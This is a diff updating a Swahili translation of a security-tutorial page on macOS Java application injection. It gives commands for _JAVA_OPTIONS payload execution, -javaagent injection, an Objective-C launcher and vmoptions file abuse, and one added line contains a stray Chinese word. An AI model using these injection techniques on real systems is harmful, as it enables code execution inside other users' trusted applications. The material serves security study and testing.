@@ -1,10 +1,10 @@
-# Java Applications Injection kwenye macOS
+# macOS Java Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumeration
 
-Tafuta Java applications zilizosakinishwa kwenye mfumo wako. Imegunduliwa kuwa Java apps kwenye **Info.plist** zitakuwa na baadhi ya java parameters zilizo na string **`java.`**, hivyo unaweza kuitafuta:
+Tafuta Java applications zilizosakinishwa kwenye mfumo wako. Ilibainika kuwa Java apps katika **Info.plist** zitakuwa na baadhi ya java parameters zenye string **`java.`**, kwa hivyo unaweza kuitafuta:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Kigezo cha mazingira **`_JAVA_OPTIONS`** kinaweza kutumiwa kuingiza parameta za java za kiholela wakati wa kutekeleza app iliyocompileiwa kwa java:
+Kigezo cha mazingira **`_JAVA_OPTIONS`** kinaweza kutumiwa kuingiza vigezo任意 vya Java VM wakati programu ya Java inapoanza.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Ili kuiendesha kama mchakato mpya na si kama mtoto wa terminal ya sasa unaweza kutumia:
+Ili kuiendesha kama mchakato mpya na si kama mchakato mtoto wa terminal ya sasa, unaweza kutumia:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Hata hivyo, hilo litasababisha error kwenye app inayotekelezwa; njia nyingine ya stealth zaidi ni kuunda java agent na kutumia:
+Hata hivyo, mbinu hiyo husababisha hitilafu katika programu inayotekelezwa. Njia mbadala isiyogundulika zaidi ni kuunda Java agent na kutumia `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Kuunda agent kwa **Java version tofauti** na ile ya application kunaweza kusababisha execution ya agent na application zote mbili ku-crash
+> Kuunda agent kwa **toleo tofauti la Java** na lile la application kunaweza ku-crash agent na application zote mbili.
 
-Ambapo agent inaweza kuwa:
+Mahali ambapo agent inaweza kuwa:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Kisha export env variable na uendeshe java application kama ifuatavyo:
+Kisha export variable ya env na uendeshe java application kama ifuatavyo:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions file
+## Faili ya vmoptions
 
-Faili hii inaunga mkono uainishaji wa **Java params** wakati Java inatekelezwa. Unaweza kutumia baadhi ya mbinu za awali kubadilisha Java params na **kuufanya mchakato utekeleze amri kiholela**.\
-Zaidi ya hayo, faili hii inaweza pia **kujumuisha nyingine** kwa kutumia directory ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.
+Faili hii inasaidia kubainisha **Java parameters** wakati Java inapotekelezwa. Unaweza kutumia baadhi ya mbinu za awali kubadilisha Java parameters na **kuufanya mchakato utekeleze amri za kiholela**.\
+Zaidi ya hayo, faili hii inaweza pia **kujumuisha faili nyingine** kwa kutumia directive ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.
 
 Zaidi ya hapo, baadhi ya Java apps **zitapakia zaidi ya faili moja ya `vmoptions`**.
 
-Baadhi ya applications kama Android Studio huonyesha katika **output mahali zinapotafuta** faili hizi, kama vile:
+Baadhi ya applications, kama vile Android Studio, huonyesha katika **output mahali zinapotafuta** faili hizi:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Baadhi ya applications kama Android Studio huonyesha katika **output mahali zina
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Ikiwa hazifanyi hivyo, unaweza kuikagua kwa urahisi kwa:
+Kama hayafanyi hivyo, unaweza kukikagua kwa:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Kumbuka jinsi inavyovutia kwamba Android Studio katika mfano huu inajaribu kupakia faili **`/Applications/Android Studio.app.vmoptions`**, mahali ambapo mtumiaji yeyote kutoka kwenye **`admin` group ana ruhusa ya kuandika.**
+Kumbuka kwamba Android Studio katika mfano huu hujaribu kupakia **`/Applications/Android Studio.app.vmoptions`**, eneo ambalo mtumiaji yeyote aliye katika **`admin` group ana ruhusa ya kuandika**.
 
+## References
+
+- [1] [OpenJDK — uchanganuzi wa `_JAVA_OPTIONS` katika `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — maelezo ya package ya `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — Kusanidi chaguo za JVM na sifa za platform](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
